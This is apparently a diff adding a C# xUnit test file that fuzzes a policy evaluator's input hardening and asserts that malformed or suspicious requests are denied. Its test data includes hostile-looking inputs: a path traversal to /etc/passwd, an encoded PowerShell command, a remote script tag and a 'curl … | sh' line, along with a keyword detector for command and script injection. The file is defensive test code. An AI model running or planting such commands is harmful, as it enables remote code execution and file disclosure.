@@ -1,0 +1,469 @@
+using System.Globalization;
+using AsiBackbone.Core.Constraints;
+using AsiBackbone.Core.Decisions;
+using AsiBackbone.Core.Evaluation;
+using AsiBackbone.Core.Results;
+using AsiBackbone.Core.ThreatModeling;
+using Xunit;
+
+namespace AsiBackbone.Core.Tests.Evaluation;
+
+/// <summary>
+/// Lightweight fuzz/property-style tests for policy input hardening invariants.
+/// </summary>
+public sealed class PolicyInputHardeningFuzzTests
+{
+    private const int MaxInputLength = 1024;
+    private const int MaxMetadataNestingDepth = 8;
+
+    public static TheoryData<string, AsiBackboneConstraintEvaluationContext, string> MalformedPolicyInputCases => new()
+    {
+        { "empty-intent", CreateContext(intent: " ", request: "approve-safe-operation"), "input.intent.empty" },
+        { "empty-request", CreateContext(intent: "approve", request: " "), "input.request.empty" },
+        { "null-request-value", CreateContext(intent: "approve", request: null), "input.request.empty" },
+        { "oversized-request-payload", CreateContext(intent: "approve", request: new string('x', MaxInputLength + 1)), "input.request.oversized" },
+        { "deeply-nested-metadata", CreateContext(intent: "approve", request: "safe", extraMetadata: MetadataWith("payload.shape", "[[[[[[[[[value]]]]]]]]]")), "input.metadata.too_deep" },
+        { "control-character-payload", CreateContext(intent: "approve", request: "safe\u0000payload"), "input.control_character" },
+        { "unicode-confusable-capability", CreateContext(intent: "approve", request: "safe", capability: "admіn"), "input.unicode_confusable" },
+        { "duplicate-conflicting-metadata-keys", CreateContext(intent: "approve", request: "safe", extraMetadata: MetadataWith("owner", "alice", "OWNER", "bob")), "input.metadata.conflicting_keys" },
+        { "invalid-region-code", CreateContext(intent: "approve", request: "safe", region: "moon-base-1"), "input.region.invalid" },
+        { "unknown-capability", CreateContext(intent: "approve", request: "safe", capability: "global-root"), "input.capability.unknown" },
+        { "malformed-capability-token", CreateContext(intent: "approve", request: "safe", capabilityToken: "not-a-token"), "input.capability_token.malformed" },
+        { "expired-capability-token", CreateContext(intent: "approve", request: "safe", capabilityToken: $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(-5).ToString("O", CultureInfo.InvariantCulture)}"), "input.capability_token.expired" },
+        { "capability-token-mismatch", CreateContext(intent: "approve", request: "safe", capability: "write", capabilityToken: $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(5).ToString("O", CultureInfo.InvariantCulture)}"), "input.capability_token.mismatch" },
+        { "malformed-acknowledgment-payload", CreateContext(intent: "approve", request: "safe", acknowledgment: "{not-json"), "input.acknowledgment.malformed" },
+        { "unexpected-enum-value", CreateContext(intent: "approve", request: "safe", extraMetadata: MetadataWith("operation.mode", "999")), "input.enum.unexpected" },
+        { "path-traversal-string", CreateContext(intent: "approve", request: "../../etc/passwd"), "input.path_traversal" },
+        { "command-like-string", CreateContext(intent: "approve", request: "powershell -EncodedCommand ZQB2AGkAbAA="), "input.command_like" },
+        { "url-script-looking-string", CreateContext(intent: "approve", request: "<script src=https://example.invalid/payload.js></script>"), "input.script_like" }
+    };
+
+    [Fact]
+    public void ConstraintEvaluationContextNormalizesMalformedConstructionInputs()
+    {
+        var context = new AsiBackboneConstraintEvaluationContext(
+            correlationId: "  corr-policy-input  ",
+            policyVersion: "   ",
+            policyHash: null,
+            metadata: new Dictionary<string, string>(StringComparer.Ordinal)
+            {
+                ["   "] = "discarded",
+                [" request.intent "] = " approve ",
+                ["null-value"] = null!
+            });
+
+        Assert.Equal("corr-policy-input", context.CorrelationId);
+        Assert.Null(context.PolicyVersion);
+        Assert.Null(context.PolicyHash);
+        Assert.True(context.HasMetadata);
+        Assert.False(context.Metadata.ContainsKey("   "));
+        Assert.Equal("approve", context.Metadata["request.intent"]);
+        Assert.Equal(string.Empty, context.Metadata["null-value"]);
+    }
+
+    [Theory]
+    [MemberData(nameof(MalformedPolicyInputCases))]
+    public async Task GeneratedMalformedPolicyInputsNeverProduceAllow(
+        string scenario,
+        AsiBackboneConstraintEvaluationContext context,
+        string expectedReasonCode)
+    {
+        DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
+
+        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
+
+        Assert.True(decision.IsDenied);
+        Assert.False(decision.IsAllowed);
+        Assert.False(decision.CanProceed);
+        Assert.Equal(expectedReasonCode, Assert.Single(decision.ReasonCodes));
+        Assert.Equal("corr-policy-input", decision.CorrelationId);
+        Assert.Equal("v-policy-input-hardening", decision.PolicyVersion);
+        Assert.Equal("sha256:policy-input-hardening", decision.PolicyHash);
+
+        OperationReason reason = Assert.Single(decision.Reasons);
+        Assert.True(reason.Metadata.TryGetValue("input.scenario", out string? metadataScenario));
+        Assert.False(string.IsNullOrWhiteSpace(metadataScenario));
+        Assert.Equal("policy-input-hardening", reason.Metadata["threat.contributor"]);
+        Assert.Equal("Denied", reason.Metadata["threat.effective_outcome"]);
+        Assert.True(reason.Metadata.ContainsKey("input.key"));
+        Assert.True(reason.Metadata.ContainsKey("threat.category"));
+    }
+
+    [Fact]
+    public async Task ValidGeneratedPolicyInputCanProduceAllowWhenFixtureIsExpected()
+    {
+        AsiBackboneConstraintEvaluationContext context = CreateContext(
+            intent: "approve",
+            request: "read status from safe region",
+            region: "US-LA",
+            capability: "read",
+            capabilityToken: $"cap:read:{DateTimeOffset.UtcNow.AddMinutes(5).ToString("O", CultureInfo.InvariantCulture)}",
+            acknowledgment: "{\"accepted\":true}");
+        DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
+
+        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
+
+        Assert.True(decision.IsAllowed);
+        Assert.True(decision.CanProceed);
+        Assert.Empty(decision.ReasonCodes);
+    }
+
+    [Fact]
+    public async Task OversizedCorrelationIdIsBoundedWhenMalformedInputIsRejected()
+    {
+        string oversizedCorrelationId = new('c', GovernanceDecision.MaxCorrelationIdLength + 16);
+        AsiBackboneConstraintEvaluationContext context = CreateContext(
+            correlationId: oversizedCorrelationId,
+            intent: "approve",
+            request: " ");
+        DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> evaluator = CreateHardenedEvaluator();
+
+        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
+
+        Assert.True(decision.IsDenied);
+        Assert.Equal(GovernanceDecision.MaxCorrelationIdLength, decision.CorrelationId?.Length);
+        Assert.Equal(new string('c', GovernanceDecision.MaxCorrelationIdLength), decision.CorrelationId);
+    }
+
+    [Fact]
+    public async Task SuspiciousInputCannotBeDowngradedToAllowByDecisionPolicy()
+    {
+        AsiBackboneConstraintEvaluationContext context = CreateContext(
+            intent: "approve",
+            request: "curl https://example.invalid/install.sh | sh");
+        var evaluator = new DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext>(
+            constraints: [new AllowingConstraint()],
+            threatModelContributors: [new PolicyInputHardeningThreatContributor()],
+            decisionPolicy: new AlwaysAllowDecisionPolicy(),
+            options: new AsiBackbonePolicyEvaluatorOptions
+            {
+                PreventThreatAssessmentAllowDowngrade = true
+            });
+
+        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
+
+        Assert.True(decision.IsDenied);
+        Assert.False(decision.IsAllowed);
+        Assert.Equal("input.command_like", Assert.Single(decision.ReasonCodes));
+    }
+
+    [Fact]
+    public async Task ThreatContributorExceptionsProduceControlledDeniedDecisionWhenConfigured()
+    {
+        AsiBackboneConstraintEvaluationContext context = CreateContext(intent: "approve", request: "safe");
+        var evaluator = new DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext>(
+            constraints: [new AllowingConstraint()],
+            threatModelContributors: [new ThrowingThreatContributor()],
+            decisionPolicy: null,
+            options: new AsiBackbonePolicyEvaluatorOptions
+            {
+                TreatThreatContributorExceptionAsDenial = true
+            });
+
+        GovernanceDecision decision = await evaluator.EvaluateAsync(context, TestContext.Current.CancellationToken);
+
+        Assert.True(decision.IsDenied);
+        Assert.False(decision.IsAllowed);
+        Assert.Equal(
+            AsiBackbonePolicyEvaluatorOptions.DefaultThreatContributorExceptionReasonCode,
+            Assert.Single(decision.ReasonCodes));
+        OperationReason reason = Assert.Single(decision.Reasons);
+        Assert.Equal("throwing-threat-contributor", reason.Metadata["threat.contributor"]);
+        Assert.Equal(nameof(InvalidOperationException), reason.Metadata["threat.failure"]);
+    }
+
+    private static DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext> CreateHardenedEvaluator()
+    {
+        return new DefaultAsiBackbonePolicyEvaluator<AsiBackboneConstraintEvaluationContext>(
+            constraints: [new AllowingConstraint()],
+            threatModelContributors: [new PolicyInputHardeningThreatContributor()],
+            decisionPolicy: null,
+            options: new AsiBackbonePolicyEvaluatorOptions
+            {
+                TreatThreatContributorExceptionAsDenial = true,
+                PreventThreatAssessmentAllowDowngrade = true
+            });
+    }
+
+    private static AsiBackboneConstraintEvaluationContext CreateContext(
+        string? intent,
+        string? request,
+        string region = "US-LA",
+        string capability = "read",
+        string? capabilityToken = null,
+        string? acknowledgment = "{\"accepted\":true}",
+        string correlationId = "corr-policy-input",
+        IReadOnlyDictionary<string, string>? extraMetadata = null)
+    {
+        Dictionary<string, string> metadata = new(StringComparer.Ordinal)
+        {
+            ["input.scenario"] = "valid",
+            ["request.intent"] = intent ?? string.Empty,
+            ["request.payload"] = request ?? string.Empty,
+            ["region.code"] = region,
+            ["capability.name"] = capability,
+            ["acknowledgment.payload"] = acknowledgment ?? string.Empty
+        };
+
+        if (!string.IsNullOrWhiteSpace(capabilityToken))
+        {
+            metadata["capability.token"] = capabilityToken;
+        }
+
+        if (extraMetadata is not null)
+        {
+            foreach (KeyValuePair<string, string> item in extraMetadata)
+            {
+                metadata[item.Key] = item.Value;
+            }
+        }
+
+        metadata["input.scenario"] = ResolveScenarioName(metadata);
+
+        return new AsiBackboneConstraintEvaluationContext(
+            correlationId,
+            policyVersion: "v-policy-input-hardening",
+            policyHash: "sha256:policy-input-hardening",
+            metadata: metadata);
+    }
+
+    private static IReadOnlyDictionary<string, string> MetadataWith(params string[] values)
+    {
+        if (values.Length % 2 != 0)
+        {
+            throw new ArgumentException("Metadata helper requires key/value pairs.", nameof(values));
+        }
+
+        Dictionary<string, string> metadata = new(StringComparer.Ordinal);
+        for (int index = 0; index < values.Length; index += 2)
+        {
+            metadata[values[index]] = values[index + 1];
+        }
+
+        return metadata;
+    }
+
+    private static string ResolveScenarioName(IReadOnlyDictionary<string, string> metadata)
+    {
+        if (string.IsNullOrWhiteSpace(metadata["request.intent"]))
+        {
+            return "empty-intent";
+        }
+
+        if (string.IsNullOrWhiteSpace(metadata["request.payload"]))
+        {
+            return "empty-request";
+        }
+
+        if (metadata["request.payload"].Length > MaxInputLength)
+        {
+            return "oversized-request-payload";
+        }
+
+        return metadata.TryGetValue("input.scenario", out string? scenario)
+            ? scenario
+            : "generated-policy-input";
+    }
+
+    private sealed class PolicyInputHardeningThreatContributor : IThreatModelContributor<AsiBackboneConstraintEvaluationContext>
+    {
+        private static readonly string[] AllowedRegions = ["US-LA", "US-TX", "US-MS"];
+        private static readonly string[] AllowedCapabilities = ["read", "write", "approve"];
+
+        public string Name => "policy-input-hardening";
+
+        public ValueTask<ThreatAssessment> AssessAsync(
+            AsiBackboneConstraintEvaluationContext context,
+            CancellationToken cancellationToken = default)
+        {
+            cancellationToken.ThrowIfCancellationRequested();
+            IReadOnlyDictionary<string, string> metadata = context.Metadata;
+            string scenario = metadata.TryGetValue("input.scenario", out string? scenarioValue) ? scenarioValue : "generated-policy-input";
+            string intent = metadata.TryGetValue("request.intent", out string? intentValue) ? intentValue : string.Empty;
+            string request = metadata.TryGetValue("request.payload", out string? requestValue) ? requestValue : string.Empty;
+            string region = metadata.TryGetValue("region.code", out string? regionValue) ? regionValue : string.Empty;
+            string capability = metadata.TryGetValue("capability.name", out string? capabilityValue) ? capabilityValue : string.Empty;
+            string acknowledgment = metadata.TryGetValue("acknowledgment.payload", out string? acknowledgmentValue) ? acknowledgmentValue : string.Empty;
+
+            ThreatAssessment assessment =
+                string.IsNullOrWhiteSpace(intent) ? Deny("input.intent.empty", "Request intent must be present.", ThreatCategories.InputMalformed, scenario, "request.intent") :
+                string.IsNullOrWhiteSpace(request) ? Deny("input.request.empty", "Request payload must be present.", ThreatCategories.InputMalformed, scenario, "request.payload") :
+                request.Length > MaxInputLength ? Deny("input.request.oversized", "Request payload exceeded the configured input length limit.", ThreatCategories.InputOversized, scenario, "request.payload") :
+                MetadataExceedsNestingLimit(metadata) ? Deny("input.metadata.too_deep", "Metadata exceeded the configured nesting limit.", ThreatCategories.InputOversized, scenario, "metadata") :
+                ContainsControlCharacters(request) ? Deny("input.control_character", "Request payload contains control characters.", ThreatCategories.InputMalformed, scenario, "request.payload") :
+                ContainsUnicodeConfusable(capability) || ContainsUnicodeConfusable(request) ? Deny("input.unicode_confusable", "Input contains non-ASCII confusable characters.", ThreatCategories.InputMalformed, scenario, "capability.name") :
+                ContainsConflictingMetadataKeys(metadata) ? Deny("input.metadata.conflicting_keys", "Metadata contains duplicate or conflicting keys.", ThreatCategories.PolicyBypassAttempt, scenario, "metadata") :
+                !AllowedRegions.Contains(region, StringComparer.Ordinal) ? Deny("input.region.invalid", "Region code is not allowed by the host policy fixture.", ThreatCategories.RegionPolicyMismatch, scenario, "region.code") :
+                !AllowedCapabilities.Contains(capability, StringComparer.Ordinal) ? Deny("input.capability.unknown", "Capability is not allowed by the host policy fixture.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.name") :
+                CreateCapabilityTokenAssessment(metadata, capability, scenario) ??
+                (!LooksLikeJsonObject(acknowledgment) ? Deny("input.acknowledgment.malformed", "Acknowledgment payload is malformed.", ThreatCategories.InputMalformed, scenario, "acknowledgment.payload") :
+                HasUnexpectedEnumValue(metadata) ? Deny("input.enum.unexpected", "Input contained an unsupported enum value.", ThreatCategories.InputMalformed, scenario, "operation.mode") :
+                ContainsPathTraversal(request) ? Deny("input.path_traversal", "Request payload contains path traversal patterns.", ThreatCategories.PolicyBypassAttempt, scenario, "request.payload") :
+                ContainsCommandLikeInput(request) ? Deny("input.command_like", "Request payload looks like a command execution attempt.", ThreatCategories.UnsafeExternalCommand, scenario, "request.payload") :
+                ContainsScriptLikeInput(request) ? Deny("input.script_like", "Request payload looks like a URL or script injection attempt.", ThreatCategories.PromptInjectionLikeInput, scenario, "request.payload") :
+                ThreatAssessment.NoThreat());
+
+            return new ValueTask<ThreatAssessment>(assessment);
+        }
+
+        private static ThreatAssessment? CreateCapabilityTokenAssessment(
+            IReadOnlyDictionary<string, string> metadata,
+            string expectedCapability,
+            string scenario)
+        {
+            if (!metadata.TryGetValue("capability.token", out string? token) || string.IsNullOrWhiteSpace(token))
+            {
+                return null;
+            }
+
+            string[] parts = token.Split(':', 3, StringSplitOptions.None);
+            if (parts.Length != 3 || !string.Equals(parts[0], "cap", StringComparison.Ordinal))
+            {
+                return Deny("input.capability_token.malformed", "Capability token is malformed.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token");
+            }
+
+            if (!string.Equals(parts[1], expectedCapability, StringComparison.Ordinal))
+            {
+                return Deny("input.capability_token.mismatch", "Capability token scope does not match the requested capability.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token");
+            }
+
+            if (!DateTimeOffset.TryParse(parts[2], CultureInfo.InvariantCulture, DateTimeStyles.AssumeUniversal, out DateTimeOffset expiresAt))
+            {
+                return Deny("input.capability_token.malformed", "Capability token expiry is malformed.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token");
+            }
+
+            return expiresAt <= DateTimeOffset.UtcNow
+                ? Deny("input.capability_token.expired", "Capability token is expired.", ThreatCategories.CapabilityTokenMismatch, scenario, "capability.token")
+                : null;
+        }
+
+        private static ThreatAssessment Deny(
+            string reasonCode,
+            string description,
+            string category,
+            string scenario,
+            string key)
+        {
+            return ThreatAssessment.Create(
+                ThreatSeverity.High,
+                category,
+                reasonCode,
+                description,
+                GovernanceDecisionOutcome.Denied,
+                metadata: new Dictionary<string, string>(StringComparer.Ordinal)
+                {
+                    ["input.scenario"] = scenario,
+                    ["input.key"] = key
+                });
+        }
+
+        private static bool ContainsControlCharacters(string value)
+        {
+            return value.Any(character => char.IsControl(character) && character is not '\r' and not '\n' and not '\t');
+        }
+
+        private static bool ContainsUnicodeConfusable(string value)
+        {
+            return value.Any(character => character > 127);
+        }
+
+        private static bool ContainsConflictingMetadataKeys(IReadOnlyDictionary<string, string> metadata)
+        {
+            HashSet<string> observed = new(StringComparer.OrdinalIgnoreCase);
+            foreach (string key in metadata.Keys)
+            {
+                if (!observed.Add(key))
+                {
+                    return true;
+                }
+            }
+
+            return false;
+        }
+
+        private static bool MetadataExceedsNestingLimit(IReadOnlyDictionary<string, string> metadata)
+        {
+            return metadata.Values.Any(value => value.Count(character => character is '[' or '{' or '(') > MaxMetadataNestingDepth);
+        }
+
+        private static bool LooksLikeJsonObject(string value)
+        {
+            string trimmed = value.Trim();
+            return trimmed.Length >= 2 && trimmed[0] == '{' && trimmed[^1] == '}';
+        }
+
+        private static bool HasUnexpectedEnumValue(IReadOnlyDictionary<string, string> metadata)
+        {
+            return metadata.TryGetValue("operation.mode", out string? value)
+                && int.TryParse(value, NumberStyles.Integer, CultureInfo.InvariantCulture, out int parsed)
+                && !Enum.IsDefined(typeof(TestOperationMode), parsed);
+        }
+
+        private static bool ContainsPathTraversal(string value)
+        {
+            return value.Contains("../", StringComparison.Ordinal) || value.Contains("..\\", StringComparison.Ordinal);
+        }
+
+        private static bool ContainsCommandLikeInput(string value)
+        {
+            return value.Contains("powershell", StringComparison.OrdinalIgnoreCase)
+                || value.Contains("encodedcommand", StringComparison.OrdinalIgnoreCase)
+                || value.Contains("curl ", StringComparison.OrdinalIgnoreCase)
+                || value.Contains(" | sh", StringComparison.OrdinalIgnoreCase);
+        }
+
+        private static bool ContainsScriptLikeInput(string value)
+        {
+            return value.Contains("<script", StringComparison.OrdinalIgnoreCase)
+                || value.Contains("javascript:", StringComparison.OrdinalIgnoreCase)
+                || (value.Contains("http://", StringComparison.OrdinalIgnoreCase) && value.Contains(".js", StringComparison.OrdinalIgnoreCase))
+                || (value.Contains("https://", StringComparison.OrdinalIgnoreCase) && value.Contains(".js", StringComparison.OrdinalIgnoreCase));
+        }
+    }
+
+    private enum TestOperationMode
+    {
+        Read = 1,
+        Write = 2,
+        Approve = 3
+    }
+
+    private sealed class AllowingConstraint : IAsiBackboneConstraint<AsiBackboneConstraintEvaluationContext>
+    {
+        public string Name => "allowing-constraint";
+
+        public ValueTask<ConstraintEvaluationResult> EvaluateAsync(
+            AsiBackboneConstraintEvaluationContext context,
+            CancellationToken cancellationToken = default)
+        {
+            return new ValueTask<ConstraintEvaluationResult>(ConstraintEvaluationResult.Allow());
+        }
+    }
+
+    private sealed class AlwaysAllowDecisionPolicy : IAsiBackboneDecisionPolicy<AsiBackboneConstraintEvaluationContext>
+    {
+        public ValueTask<GovernanceDecision> ApplyAsync(
+            AsiBackboneConstraintEvaluationContext context,
+            GovernanceDecision composedDecision,
+            IReadOnlyList<ConstraintEvaluationResult> constraintResults,
+            CancellationToken cancellationToken = default)
+        {
+            return new ValueTask<GovernanceDecision>(GovernanceDecision.Allow(
+                correlationId: context.CorrelationId,
+                policyVersion: context.PolicyVersion,
+                policyHash: context.PolicyHash));
+        }
+    }
+
+    private sealed class ThrowingThreatContributor : IThreatModelContributor<AsiBackboneConstraintEvaluationContext>
+    {
+        public string Name => "throwing-threat-contributor";
+
+        public ValueTask<ThreatAssessment> AssessAsync(
+            AsiBackboneConstraintEvaluationContext context,
+            CancellationToken cancellationToken = default)
+        {
+            throw new InvalidOperationException("Simulated contributor failure.");
+        }
+    }
+}
